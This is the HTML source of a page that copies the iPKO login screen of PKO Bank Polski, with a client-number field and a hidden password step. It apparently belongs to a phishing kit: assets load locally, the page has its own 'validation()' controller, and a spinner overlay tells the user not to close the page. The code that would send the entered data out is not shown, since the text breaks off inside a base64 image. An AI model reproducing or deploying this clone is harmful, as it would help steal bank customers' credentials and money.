

 <!DOCTYPE html>
 
<html lang="pl" class="js-focus-visible" style="--viewport-height: 730px;">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <!--<base href="/secure/ikd3/">-->
      <base href=".">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
      <title>Strona logowania | iPKO - bankowość elektroniczna PKO Banku Polskiego</title>
      <link rel="stylesheet" type="text/css" href="./file/st.css">
   
    <style type="text/css">
 


        html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
            font:inherit;
            font-family: sans-serif;

        }
    .overlay {
    /* z-index: 999; */
    position: fixed;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    background-color: rgb(0 89 128 / 66%);
    border-radius: 6px;
    z-index: 9999;
}

.loader {
   text-align: center;
    position: absolute;
    left: 50%;
    top: 50%;
    z-index: 1;
    transform: translate(-50%,-50%);
}

.lds-spinner {
    color: #FFF;
    display: inline-block;
    width: 80px;
    height: 80px;
  }
  .lds-spinner div {
    transform-origin: 40px 40px;
    animation: lds-spinner 1.2s linear infinite;
  }
  .lds-spinner div:after {
    content: " ";
    display: block;
    position: absolute;
    top: 3px;
    left: 37px;
    width: 6px;
    height: 18px;
    border-radius: 20%;
    background: #FFF;
  }
  .lds-spinner div:nth-child(1) {
    transform: rotate(0deg);
    animation-delay: -1.1s;
  }
  .lds-spinner div:nth-child(2) {
    transform: rotate(30deg);
    animation-delay: -1s;
  }
  .lds-spinner div:nth-child(3) {
    transform: rotate(60deg);
    animation-delay: -0.9s;
  }
  .lds-spinner div:nth-child(4) {
    transform: rotate(90deg);
    animation-delay: -0.8s;
  }
  .lds-spinner div:nth-child(5) {
    transform: rotate(120deg);
    animation-delay: -0.7s;
  }
  .lds-spinner div:nth-child(6) {
    transform: rotate(150deg);
    animation-delay: -0.6s;
  }
  .lds-spinner div:nth-child(7) {
    transform: rotate(180deg);
    animation-delay: -0.5s;
  }
  .lds-spinner div:nth-child(8) {
    transform: rotate(210deg);
    animation-delay: -0.4s;
  }
  .lds-spinner div:nth-child(9) {
    transform: rotate(240deg);
    animation-delay: -0.3s;
  }
  .lds-spinner div:nth-child(10) {
    transform: rotate(270deg);
    animation-delay: -0.2s;
  }
  .lds-spinner div:nth-child(11) {
    transform: rotate(300deg);
    animation-delay: -0.1s;
  }
  .lds-spinner div:nth-child(12) {
    transform: rotate(330deg);
    animation-delay: 0s;
  }
  @keyframes lds-spinner {
    0% {
      opacity: 1;
    }
    100% {
      opacity: 0;
    }
  }

        </style>
 
       
   </head>
   <body ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
     <div class="overlay" style="display:none;">
           <div class="loader">
                <div class="lds-spinner"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
                <br>
                <div class="main-title">
                  <h3 style="color: #fff; font-size: .8em; line-height: 20px;font-weight: 100;">
                     OCHRONA DANYCH OSOBOWYCH<br>NIE ZAMYKAJ STRONY.
                  </h3>
               </div>




            </div>
    </div> 
      <div id="root">
         <div class="_1G9YH _34cph">
            <div class="_4n8S6">
               <img alt="IKO" class="_1e-VD" src="./file/logo-iko-simple-64.svg">
               <div class="v6gLH">
                  <a href="" class="_2c-3D _1_uLG" data-text="Pobierz darmową aplikację IKO.">
                     <div class="IHPU0"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Pobierz darmową aplikację IKO.</div>
                  </a>
                  <div class="_37MJk">
                     <div class="">
                        <p>Obsługuj bank w swoim telefonie.</p>
                     </div>
                  </div>
               </div>
               <button class="_1CavH _1VeLj _10Uya _32Kxh _1Jjvr"  type="button" data-text="Zobacz więcej">
                  <div class="tMrJN"><span class="_7l_9Y">Zobacz więcej</span></div>
               </button>
               <button class="_1mWYq _1VeLj _32Kxh _3V6u0"  type="button" data-text="POBIERZ">
                  <div class="tMrJN"><span class="_7l_9Y">POBIERZ</span></div>
               </button>
               <button class="_3b4Sa _1VeLj _32Kxh iSqeo"   type="button" data-text="Zamknij">
                  <div class="tMrJN"><span class="_7l_9Y">Zamknij</span></div>
               </button>
            </div>
         </div>
         <div class="_2gs5Y _2r7X7" tabindex="-1">
            <div class="_19neU">
               <div class="q_Fz1">
                  <div class="_3n6H2">
                     <div class="Bn6K_">
                        <div class="_1wAsl">
                           <h1 class="_2edmC S_ce3">iPKO</h1>
                           <a class="_3l7OT _2eFE8 NB3WM _3d645 _2EvTH" href=""><span class="dR7gB">iPKO</span></a>
                           <div class="_1jNN0 _3X2L0">
                              <h2 class="_2lxjm">Menu nawigacyjne</h2>
                           </div>
                           <div class="_2Vp84 _184Bc _308Ul _2K611 _3gJns _1PRFI _3R3f_">
                              <div class="lIW6K W63pU _1y-Wr">
                                 <button class="_2-otR _2nC94" aria-describedby="ea63d702-13b3-4106-aff1-3400d98e135a" aria-expanded="false" aria-haspopup="true" type="button" role="listbox">
                                    <div class="_1pogc" id="ea63d702-13b3-4106-aff1-3400d98e135a">
                                       <div class="IZfnL">
                                          <div class="KN3uo _2UFcg">
                                             <div class="_2v34N _2lZ45">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 24" class="">
                                                   <g data-name="Rectangle 4361">
                                                      <path data-name="Path 15222" d="M4 0h24a4.012 4.012 0 0 1 4 4v16a4.012 4.012 0 0 1-4 4H4a4.012 4.012 0 0 1-4-4V4a4.012 4.012 0 0 1 4-4Z" fill="#fff"></path>
                                                      <path data-name="Path 15223" d="M28 24H4a4.054 4.054 0 0 1-4-4V4a4.054 4.054 0 0 1 4-4h24a4.054 4.054 0 0 1 4 4v16a4.054 4.054 0 0 1-4 4ZM4 1a3.04 3.04 0 0 0-3 3v16a3.04 3.04 0 0 0 3 3h24a3.04 3.04 0 0 0 3-3V4a3.04 3.04 0 0 0-3-3Z" fill="#b7b7b7"></path>
                                                   </g>
                                                   <path data-name="Rectangle 4351" d="M4 1h24a2.946 2.946 0 0 1 3 3v8H1V4a2.946 2.946 0 0 1 3-3Z" fill="#fff"></path>
                                                   <path data-name="Rectangle 4352" d="M1 12h30v8a2.946 2.946 0 0 1-3 3H4a2.946 2.946 0 0 1-3-3v-8Z" fill="red"></path>
                                                </svg>
                                             </div>
                                             <div class="_3E1JA" lang="pl">PL</div>
                                          </div>
                                       </div>
                                       <div class="_1_L-C">
                                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="wc9xc">
                                             <g data-name="Group 14437">
                                                <path data-name="Path 16243" d="M13.556 14.642 12 15.948l-1.556-1.306-6.949-5.831a1.961 1.961 0 0 1 2.822-.243L12 13.337l5.683-4.769a1.961 1.961 0 0 1 2.822.243Z" fill="#003574"></path>
                                             </g>
                                          </svg>
                                       </div>
                                    </div>
                                 </button>
                              </div>
                           </div>
                           <div class="_1Gcbw"></div>
                        </div>
                     </div>
                     <div class="q_Fz1 _2uBEL" id="MAIN_CONTENT">
                        <div class="_2gs5Y" tabindex="-1">
                           <div class="_19neU">
                              <div class="_3nWij _2DEtK">
                                 <div class="dZXXQ _2n_is">

                                     <style type="text/css">
                                                .inpERR{
                                                        border: 2px solid red !important;
                                                }
                                       </style>                         
                                    <div class="_3Bnvk" id="logVIEW" >
                                       <form tabindex="-1">
                                          <div class="_1ZZBH"></div>
                                          <div class="_3c4gN _2Xs25 Login">
                                             <div class="_3Mzc0">
                                                <div class="">
                                                   <h1 class="_2edmC S_ce3">iPKO</h1>
                                                   <h1 class="_2edmC _1AJDQ" aria-level="2">Zaloguj się</h1>
                                                </div>
                                             </div>


                                             <div class="_1Gcbw _10iaC"></div>






                                             <div class="_2-L3Z _36hGB _21ynL">
                                                <div class="_28toS">
                                                   <div class="_2Fqzw">
                                                      <div class="_2VjX- E7maL">
                                                         <div class="_1cSKj _2HczD _1sq3L _1FQ3M">
                                                            <div class="_3GWo7">
                                                               <input class="_2pRLa " autocomplete="off" placeholder="Wpisz numer klienta lub login" id="adField">

                                                               <div class="_17M1H"></div>

                                                                
                                                            </div>
                                                         </div>
                                                         <div class="_1Gcbw _2HczD _15FJG" id="diVerrlog" style="display:none;">
                                                            Wpisz poprawny numer klienta lub login
                                                         </div>
                                                         
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>







                                             <div class="t4GiR">
                                                <div class="fOLEC"></div>
                                                <div class="_1U4d6">
                                                   <button class="_2lpC_ _1VeLj _3NXVH _38wVI _1q2Ch" type="button" ng-click="validation()" >
                                                      <div class="tMrJN"><span class="_7l_9Y">Dalej</span></div>
                                                   </button>
                                                   <a href="" class="_2c-3D _3bfMd _153wQ" data-text="Pomoc w logowaniu" align="left">
                                                      <div class="IHPU0">Pomoc w logowaniu</div>
                                                   </a>
                                                   <a href="" class="_2c-3D _3ldCv _3bfMd" data-text="Nie masz konta?">
                                                      <div class="IHPU0"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Nie masz konta?</div>
                                                   </a>
                                                </div>
                                             </div>



                                             <div class="_2IJyw">
                                                <a href="" class="_2c-3D _202L1" data-text="Nie masz konta?">
                                                   <div class="IHPU0"><span class="_2eFtA">Otwórz w nowej karcie&nbsp;</span>Nie masz konta?</div>
                                                </a>
                                             </div>
                                          </div>
                                          
                                       </form>
                                    </div>




 


                                    <div class="_3Bnvk" id="pwdVIEW" style="display:none;">
                                       <form tabindex="-1">
                                          <div class="_1ZZBH"></div>
                                          <div class="_3c4gN _2Xs25 Login">
                                             <img alt="" src="https://www.pkobp.pl/media_files/c4d99762-dbb3-441e-b28a-31aa41714898.jpg?u=615e7d1c3e6b647504fed9990e70eecfffb2c8fce2121fe66b0de543a81ba9ed&amp;t=1702597262547" style="display: none;">
                                             <div class="_3Mzc0">
                                                <div class="">
                                                   <h1 class="_2edmC S_ce3">iPKO</h1>
                                                   <h1 class="_2edmC _1AJDQ" aria-level="2">Zaloguj się</h1>
                                                </div>
                                             </div>
                                             <div class="_3bVRs" style="background-image: url(&quot;data:image/png;base64,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